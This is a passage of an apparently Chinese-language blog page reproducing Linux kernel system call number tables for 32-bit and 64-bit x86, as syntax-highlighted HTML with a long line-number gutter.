delete when C lib stub is removed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents64     220</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl64        221</span></span><br><span class="line"><span class="comment">/* 223 is unused */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettid     224</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readahead      225</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setxattr       226</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lsetxattr      227</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsetxattr      228</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getxattr       229</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lgetxattr      230</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fgetxattr      231</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listxattr      232</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_llistxattr     233</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flistxattr     234</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_removexattr    235</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lremovexattr   236</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fremovexattr   237</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tkill      238</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile64     239</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futex      240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setaffinity  241</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getaffinity  242</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_thread_area    243</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_thread_area    244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_setup       245</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_destroy     246</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_getevents   247</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_submit      248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_cancel      249</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64      250</span></span><br><span class="line"><span class="comment">/* 251 is available for reuse (was briefly sys_set_zone_reclaim) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit_group     252</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create   254</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl      255</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait     256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_remap_file_pages   257</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_tid_address    258</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_create   259</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_settime  (__NR_timer_create+1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_gettime  (__NR_timer_create+2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_getoverrun   (__NR_timer_create+3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_delete   (__NR_timer_create+4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_settime  (__NR_timer_create+5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_gettime  (__NR_timer_create+6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_getres   (__NR_timer_create+7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_nanosleep    (__NR_timer_create+8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs64       268</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs64      269</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tgkill     270</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimes     271</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64_64   272</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vserver        273</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mbind      274</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_mempolicy  275</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_mempolicy  276</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_open        277</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_unlink      (__NR_mq_open+1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedsend   (__NR_mq_open+2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedreceive    (__NR_mq_open+3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_notify      (__NR_mq_open+4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_getsetattr  (__NR_mq_open+5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_load     283</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitid     284</span></span><br><span class="line"><span class="comment">/* #define __NR_sys_setaltroot  285 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_add_key        286</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_request_key    287</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_keyctl     288</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_set     289</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_get     290</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init   291</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_add_watch  292</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_rm_watch   293</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_migrate_pages  294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat     295</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdirat        296</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknodat        297</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchownat       298</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futimesat      299</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatat64      300</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlinkat       301</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat       302</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_linkat     303</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlinkat      304</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlinkat     305</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmodat       306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_faccessat      307</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pselect6       308</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ppoll      309</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unshare        310</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_robust_list    311</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_robust_list    312</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_splice     313</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync_file_range    314</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tee        315</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vmsplice       316</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_pages     317</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcpu     318</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_pwait    319</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimensat      320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd       321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd        322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd        323</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fallocate      324</span></span><br></pre></td></tr></table></figure><p><strong>x86平台64位Linux系统调用号</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This file contains the system call numbers.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note: holes are not allowed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* at least 8 syscall per cacheline */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read               0</span></span><br><span class="line">__SYSCALL(__NR_read, sys_read)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write              1</span></span><br><span class="line">__SYSCALL(__NR_write, sys_write)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open               2</span></span><br><span class="line">__SYSCALL(__NR_open, sys_open)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close              3</span></span><br><span class="line">__SYSCALL(__NR_close, sys_close)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat               4</span></span><br><span class="line">__SYSCALL(__NR_stat, sys_newstat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat              5</span></span><br><span class="line">__SYSCALL(__NR_fstat, sys_newfstat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat              6</span></span><br><span class="line">__SYSCALL(__NR_lstat, sys_newlstat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll               7</span></span><br><span class="line">__SYSCALL(__NR_poll, sys_poll)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek              8</span></span><br><span class="line">__SYSCALL(__NR_lseek, sys_lseek)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap               9</span></span><br><span class="line">__SYSCALL(__NR_mmap, sys_mmap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect               10</span></span><br><span class="line">__SYSCALL(__NR_mprotect, sys_mprotect)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap             11</span></span><br><span class="line">__SYSCALL(__NR_munmap, sys_munmap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk                12</span></span><br><span class="line">__SYSCALL(__NR_brk, sys_brk)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction           13</span></span><br><span class="line">__SYSCALL(__NR_rt_sigaction, sys_rt_sigaction)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask         14</span></span><br><span class="line">__SYSCALL(__NR_rt_sigprocmask, sys_rt_sigprocmask)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn           15</span></span><br><span class="line">__SYSCALL(__NR_rt_sigreturn, stub_rt_sigreturn)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl              16</span></span><br><span class="line">__SYSCALL(__NR_ioctl, sys_ioctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64                17</span></span><br><span class="line">__SYSCALL(__NR_pread64, sys_pread64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64               18</span></span><br><span class="line">__SYSCALL(__NR_pwrite64, sys_pwrite64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv              19</span></span><br><span class="line">__SYSCALL(__NR_readv, sys_readv)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev             20</span></span><br><span class="line">__SYSCALL(__NR_writev, sys_writev)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access             21</span></span><br><span class="line">__SYSCALL(__NR_access, sys_access)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe               22</span></span><br><span class="line">__SYSCALL(__NR_pipe, sys_pipe)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select             23</span></span><br><span class="line">__SYSCALL(__NR_select, sys_select)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield            24</span></span><br><span class="line">__SYSCALL(__NR_sched_yield, sys_sched_yield)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap             25</span></span><br><span class="line">__SYSCALL(__NR_mremap, sys_mremap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync              26</span></span><br><span class="line">__SYSCALL(__NR_msync, sys_msync)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore                27</span></span><br><span class="line">__SYSCALL(__NR_mincore, sys_mincore)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise                28</span></span><br><span class="line">__SYSCALL(__NR_madvise, sys_madvise)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget             29</span></span><br><span class="line">__SYSCALL(__NR_shmget, sys_shmget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat              30</span></span><br><span class="line">__SYSCALL(__NR_shmat, sys_shmat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl             31</span></span><br><span class="line">__SYSCALL(__NR_shmctl, sys_shmctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup                32</span></span><br><span class="line">__SYSCALL(__NR_dup, sys_dup)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2               33</span></span><br><span class="line">__SYSCALL(__NR_dup2, sys_dup2)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause              34</span></span><br><span class="line">__SYSCALL(__NR_pause, sys_pause)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep              35</span></span><br><span class="line">__SYSCALL(__NR_nanosleep, sys_nanosleep)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer              36</span></span><br><span 